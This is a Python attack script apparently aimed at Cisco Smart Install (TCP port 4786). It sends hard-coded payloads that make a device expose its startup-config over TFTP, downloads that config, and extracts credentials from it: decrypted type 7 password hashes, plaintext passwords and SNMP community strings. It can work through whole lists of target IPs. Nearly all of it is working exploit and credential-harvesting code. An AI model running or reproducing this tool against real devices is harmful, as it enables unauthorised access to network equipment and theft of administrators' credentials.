#!/usr/bin/python3

import socket
import sys
import time
import os 
import tftpy
import subprocess
import argparse

def banner():
    print("""                                                                                                                                                                  
 __     __   __   __      __              __  ___     ___      __        __    ___ 
/  ` | /__` /  ` /  \    /__`  |\/|  /\  |__)  |     |__  \_/ |__) |    /  \ |  |  
\__, | .__/ \__, \__/    .__/  |  | /~~\ |  \  |     |___ / \ |    |___ \__/ |  |                                                                                
by @AlrikRr                                                                                                                                                                       
""")


def check_c7decrypt():
    try:
        subprocess.check_output(["c7decrypt", "-h"], stderr=subprocess.DEVNULL)
        return True
    except subprocess.CalledProcessError:
        return False

def display(text, color):
    colors = {
        "green": "\033[32m",
        "red": "\033[31m",
        "orange": "\033[33m",
        "purple": "\033[35m",
        "end": "\033[0m"
    }
    if color not in colors:
        color = "end"
    print(f"{colors[color]}{text}{colors['end']}")

def process_hash7(content,ip):
    hash_list = [] #data stored as --> username:hash7
    for line in content:
        if "secret 7" in line or "password 7" in line:
            hash_line = line.split()[-1] # store hash at the end of the line
            if line.split()[0] == "enable":
                user_line = line.split()[0] #store enable username which is the element 0
            else:
                user_line = line.split()[1] #store real username which is the element 1
            hash_list.append(user_line+":"+hash_line)
    if len(hash_list) == 0:
        display(f"[-] No 7 hash found on {ip}", "red")
    else:
        display(f"\n[+] Found {len(hash_list)} hash(es) level 7 on {ip}:", "green")
        for h in hash_list:
            if check_c7decrypt():
                try:
                    username = h.split(":")[0]
                    hash7 = h.split(":")[1]
                    password_plain = subprocess.check_output(["c7decrypt", "-s", hash7])
                    display("- "+username+":"+password_plain.decode().strip(), "end")
                except subprocess.CalledProcessError:
                    display(f"[-] Failed running c7decrypt on {hash7} from {ip}-config", "red")
            else:
                display("[!] c7decrypt not installed", "orange")

def process_plainpass(content,ip):
    plainpass_list = [] #data stored as --> username:plainpass

    for line in content:
        if "password 0" in line:
            plainpass_data = line.split()[-1]
            if line.split()[0] == "enable":
                username_data = line.split()[0] #store enable username which is the element 0
            else:
                username_data = line.split()[1] #store username which is the element 1
            plainpass_list.append(username_data+":"+plainpass_data)
    if len(plainpass_list) == 0:
        display(f"[-] No plain text password found on {ip}", "red")
    else:
        display(f"\n[+] Found {len(plainpass_list)} plain text password(s) on {ip}:", "green")
        for data in plainpass_list:
            display("- "+data, "end")
def process_community(content,ip):
    community_list = [] # data stored as --> "community_string_name --> community_string_right"

    for line in content:
        if "snmp-server community" in line:
            community_name = line.split()[2]
            community_right = line.split()[3]
            community_list.append(community_name+" --> "+community_right)

    if len(community_list) == 0:
        display(f"[-] No Community string found on {ip}","red")
    else:
        display(f"\n[+] Found {len(community_list)} Community string on {ip}:", "green")
        for cs in community_list:
            display(f"- {cs}","end")

def process_ip(ip):
    payload = "00000001000000010000000A00000050FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF555CCA6800000000000000000000000000000000FFFFFFFF00000001"
    payload2 = "000000010000000100000008000001680001001400000001000000000021D863A560000000020154636F6E66696775726520746674702D736572766572206E7672616D3A737461727475702D636F6E666967000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    port = 4786 
    srvsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srvsock.settimeout(3) 
    try:
        srvsock.connect((ip, port))
        display(f"[+] Connecting to {ip}", "green")
        srvsock.sendall(payload.encode())
        srvsock.sendall(payload2.encode())
        srvsock.close()
        time.sleep(5)
        display(f"[!] Downloading config on {ip}", "orange")
        filename = f"{ip}-config"

        try:
            client = tftpy.TftpClient(ip, 69)
            client.download('startup-config', filename, timeout=5)
            display(f"[+] Config downloaded on {ip}!", "green")
            try:
                with open(filename, 'r') as f:
                    content = f.readlines()
                process_hash7(content,ip)
                process_plainpass(content,ip)
                process_community(content,ip)
            except Exception as e:
                display(f"[-] Failed to  open {filename}", "red")
        except tftpy.TftpException as e:
            display(f"[-] Failed to download {ip}", "red")
    except Exception:
        display(f"[-] Failed to connect on {ip}", "red")

banner()
parser = argparse.ArgumentParser()

group = parser.add_mutually_exclusive_group(required=True)

group.add_argument("-i", type=str, help="Single IP Address",metavar="IP")
group.add_argument("-f", type=argparse.FileType('r'), help="File that contains IP list",metavar="FILE")
group.add_argument("-c", type=argparse.FileType('r'), help="running-config File standalone",metavar="CONFIG")
args = parser.parse_args()

if args.i:
    input_ip = args.i
    process_ip(input_ip)
elif args.f:
    input_file = args.f
    with open(input_file.name,'r') as ip_list:
        for ip in ip_list:
            process_ip(ip.rstrip())
            display("\n--- Next Target ---\n","purple")
elif args.c:
    input_file = args.c
    with open(input_file.name,'r') as conf_file:
        content = conf_file.readlines()
    process_hash7(content,input_file.name)
    process_plainpass(content,input_file.name)
    process_community(content,input_file.name)